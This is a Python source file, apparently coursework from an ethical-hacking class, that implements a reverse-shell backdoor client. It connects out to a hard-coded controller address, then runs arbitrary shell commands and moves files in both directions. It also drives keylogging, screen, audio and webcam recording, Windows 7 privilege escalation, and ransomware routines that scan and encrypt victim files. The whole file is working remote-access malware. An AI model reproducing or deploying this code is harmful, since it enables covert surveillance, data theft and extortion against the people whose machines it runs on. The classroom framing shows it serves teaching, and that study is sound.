################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary Python modules
import socket  # For network communication
import time  # For adding delays
import subprocess  # For running shell commands
import json  # For encoding and decoding data in JSON format
import os  # For interacting with the operating system

# Import enhanced features
keylogger = None
recorder = None  
privilege_escalator = None
camera = None
ransomware = None

import sys
import os

# Add current directory to Python path for imports
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

# Import enhanced features
from features.keylogger import create_keylogger
from features.recording import create_surveillance_recorder
from features.privilege import Windows7PrivilegeEscalator
from features.camera import create_camera_surveillance
from features.ransomware_client import create_ransomware_client


# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    s.send(jsondata.encode())  # Send the encoded data over the network


# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
            return json.loads(data)  # Parse the received JSON data
        except ValueError:
            continue


# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
        try:
            # Connect to a remote host - CHANGE THIS IP TO YOUR KALI LINUX IP
            s.connect(('192.168.56.104', 5555))  # Update this to your Kali IP
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except:
            # If a connection error occurs, retry the connection
            connection()


# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')  # Open the specified file in binary read mode
    s.send(f.read())  # Read and send the file's contents over the network
    f.close()  # Close the file


# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')  # Open a file for binary write mode
    s.settimeout(1)  # Set a timeout for receiving data
    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)  # Write the received data to the file
        try:
            chunk = s.recv(1024)  # Receive the next chunk
        except socket.timeout as e:
            break
    s.settimeout(None)  # Reset the timeout setting
    f.close()  # Close the file when done


# Main shell function for command execution with enhanced features
def shell():
    global keylogger, recorder, privilege_escalator, camera, ransomware
    
    while True:
        # Receive a command from the remote host
        command = reliable_recv()
        
        if command == 'quit':
            # If the command is 'quit', exit the shell loop
            break
        elif command == 'clear':
            # If the command is 'clear', do nothing (used for clearing the screen)
            pass
        elif command[:3] == 'cd ':
            # If the command starts with 'cd ', change the current directory
            try:
                os.chdir(command[3:])
                reliable_send("Directory changed successfully")
            except Exception as e:
                reliable_send("Error changing directory: " + str(e))
                
        # KEYLOGGER COMMANDS
        elif command == 'start_keylog':
            try:
                if keylogger is None:
                    keylogger = create_keylogger("keylog.txt")
                    if keylogger.start():
                        reliable_send("Keylogger started successfully")
                    else:
                        reliable_send("Failed to start keylogger")
                elif keylogger.start():
                    reliable_send("Keylogger started successfully")
                else:
                    reliable_send("Failed to start keylogger")
            except Exception as e:
                reliable_send("Keylogger error: " + str(e))
                
        elif command == 'stop_keylog':
            try:
                if keylogger and keylogger.stop():
                    reliable_send("Keylogger stopped successfully")
                else:
                    reliable_send("Keylogger not running or failed to stop")
            except Exception as e:
                reliable_send("Stop keylogger error: " + str(e))
                
        elif command == 'get_keylog':
            try:
                with open('keylog.txt', 'r', encoding='utf-8') as f:
                    keylog_data = f.read()
                    if keylog_data:
                        reliable_send(keylog_data)
                    else:
                        reliable_send("Keylog file is empty")
            except Exception as e:
                reliable_send("Error reading keylog: " + str(e))
                
        # RECORDING COMMANDS
        elif command == 'screenshot':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                success, msg = recorder.screen_recorder.take_screenshot()
                reliable_send("Screenshot: " + msg)
            except Exception as e:
                reliable_send("Screenshot error: " + str(e))
                
        elif command == 'start_recording':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                success, msg = recorder.start_surveillance(duration=30, audio=True, video=True)
                reliable_send("Recording: " + msg)
            except Exception as e:
                reliable_send("Recording error: " + str(e))
                
        elif command == 'stop_recording':
            try:
                if recorder:
                    success, msg = recorder.stop_surveillance()
                    reliable_send("Stop recording: " + msg)
                else:
                    reliable_send("No recording active")
            except Exception as e:
                reliable_send("Stop recording error: " + str(e))
                
        elif command == 'list_recordings':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                recordings = recorder.list_recordings()
                reliable_send("Recordings: " + json.dumps(recordings, indent=2))
            except Exception as e:
                reliable_send("List recordings error: " + str(e))
                
        # CAMERA COMMANDS
        elif command == 'camera_photo':
            try:
                if camera is None:
                    camera = create_camera_surveillance("recordings")
                success, msg = camera.take_snapshot()
                reliable_send("Camera Photo: " + msg)
            except Exception as e:
                reliable_send("Camera photo error: " + str(e))
                
        elif command == 'start_camera_recording':
            try:
                if camera is None:
                    camera = create_camera_surveillance("recordings")
                success, msg = camera.start_surveillance(duration=30)
                reliable_send("Camera Recording: " + msg)
            except Exception as e:
                reliable_send("Camera recording error: " + str(e))
                
        elif command == 'stop_camera_recording':
            try:
                if camera:
                    success, msg = camera.stop_surveillance()
                    reliable_send("Stop Camera: " + msg)
                else:
                    reliable_send("No camera recording active")
            except Exception as e:
                reliable_send("Stop camera error: " + str(e))
                
        elif command == 'camera_status':
            try:
                if camera is None:
                    camera = create_camera_surveillance("recordings")
                status = camera.get_system_status()
                reliable_send("Camera Status: " + json.dumps(status, indent=2))
            except Exception as e:
                reliable_send("Camera status error: " + str(e))
                
        elif command == 'list_camera_recordings':
            try:
                if camera is None:
                    camera = create_camera_surveillance("recordings")
                recordings = camera.list_recordings()
                reliable_send("Camera Recordings: " + json.dumps(recordings, indent=2))
            except Exception as e:
                reliable_send("List camera recordings error: " + str(e))
                
        # PRIVILEGE ESCALATION COMMANDS
        elif command == 'check_privs':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                reliable_send("Current privileges: " + privilege_escalator.current_privileges)
            except Exception as e:
                reliable_send("Check privileges error: " + str(e))
                
        elif command == 'escalate':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                success, results = privilege_escalator.escalate_privileges()
                reliable_send("Escalation result: " + str(success) + "\nDetails: " + str(results)[:1000])
            except Exception as e:
                reliable_send("Escalation error: " + str(e))
                
        elif command == 'privesc_report':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                report = privilege_escalator.generate_windows7_report()
                # Send abbreviated report to avoid overwhelming the connection
                brief_report = {
                    'current_privileges': report.get('current_privileges'),
                    'system_info': {k: v for k, v in report.get('system_info', {}).items() if k in ['username', 'is_admin', 'windows_version']},
                    'total_opportunities': len(report.get('escalation_opportunities', {}))
                }
                reliable_send("Privilege Report: " + json.dumps(brief_report, indent=2))
            except Exception as e:
                reliable_send("Report error: " + str(e))
        
        # RANSOMWARE COMMANDS (Clean networking layer)
        elif command == 'ransomware_init':
            try:
                if ransomware is None:
                    ransomware = create_ransomware_client()
                    session_id = f"session_{int(time.time())}"
                    ransomware.set_session_id(session_id)
                system_info = ransomware.get_system_info()
                reliable_send("Ransomware initialized: " + json.dumps(system_info, indent=2))
            except Exception as e:
                reliable_send("Ransomware init error: " + str(e))
                
        elif command == 'ransomware_scan':
            try:
                if ransomware is None:
                    ransomware = create_ransomware_client()
                target_files = ransomware.scan_target_files(max_files=10)  # Limit for safety
                reliable_send(f"Found {len(target_files)} target files")
            except Exception as e:
                reliable_send("Scan error: " + str(e))
                
        elif command.startswith('ransomware_encrypt '):
            try:
                if ransomware is None:
                    ransomware = create_ransomware_client()
                
                # Parse number of files to encrypt
                try:
                    num_files = int(command.split()[1])
                except:
                    num_files = 5
                
                target_files = ransomware.scan_target_files(max_files=num_files)
                if target_files:
                    results = ransomware.prepare_files_batch_for_server(target_files)
                    
                    # Convert file data to hex for transmission
                    prepared_files = []
                    for file_info in results['prepared_files']:
                        prepared_files.append({
                            'file_path': file_info['file_path'],
                            'file_data_hex': file_info['file_data'].hex(),
                            'file_info': file_info['file_info']
                        })
                    
                    # Send prepared data as JSON
                    response_data = {
                        'action': 'encrypt_batch',
                        'session_id': ransomware.session_id,
                        'prepared_files': prepared_files,
                        'failed_files': results['failed']
                    }
                    reliable_send(json.dumps(response_data))
                else:
                    reliable_send("No target files found")
            except Exception as e:
                reliable_send("Encrypt error: " + str(e))
                
        elif command == 'ransomware_status':
            try:
                if ransomware is None:
                    reliable_send("Ransomware not initialized")
                else:
                    encrypted_files = ransomware.get_encrypted_files_list()
                    found_encrypted = ransomware.find_encrypted_files()
                    status = {
                        'session_id': ransomware.session_id,
                        'logged_encrypted_files': len(encrypted_files) if isinstance(encrypted_files, list) else 0,
                        'found_encrypted_files': len(found_encrypted)
                    }
                    reliable_send(json.dumps(status, indent=2))
            except Exception as e:
                reliable_send("Status error: " + str(e))
                
        elif command == 'ransomware_decrypt_attempt':
            try:
                if ransomware is None:
                    ransomware = create_ransomware_client()
                result = ransomware.attempt_decrypt()
                reliable_send(json.dumps(result, indent=2))
            except Exception as e:
                reliable_send("Decrypt attempt error: " + str(e))
                
        # FILE OPERATIONS
        elif command[:8] == 'download':
            # If the command starts with 'download', upload a file to the remote host
            try:
                upload_file(command[9:])
                reliable_send("File " + command[9:] + " uploaded successfully")
            except Exception as e:
                reliable_send("Download error: " + str(e))
        elif command[:6] == 'upload':
            # If the command starts with 'upload', download a file from the remote host
            try:
                download_file(command[7:])
                reliable_send("File " + command[7:] + " downloaded successfully")
            except Exception as e:
                reliable_send("Upload error: " + str(e))
        else:
            # For other commands, execute them using subprocess
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
                result = result.decode('utf-8', errors='ignore')  # Decode the output to a string
                # Send the command execution result back to the remote host
                if result:
                    reliable_send(result)
                else:
                    reliable_send("Command executed successfully (no output)")
            except Exception as e:
                reliable_send("Command execution error: " + str(e))


# Create a socket object for communication over IPv4 and TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process by calling the connection() function
connection()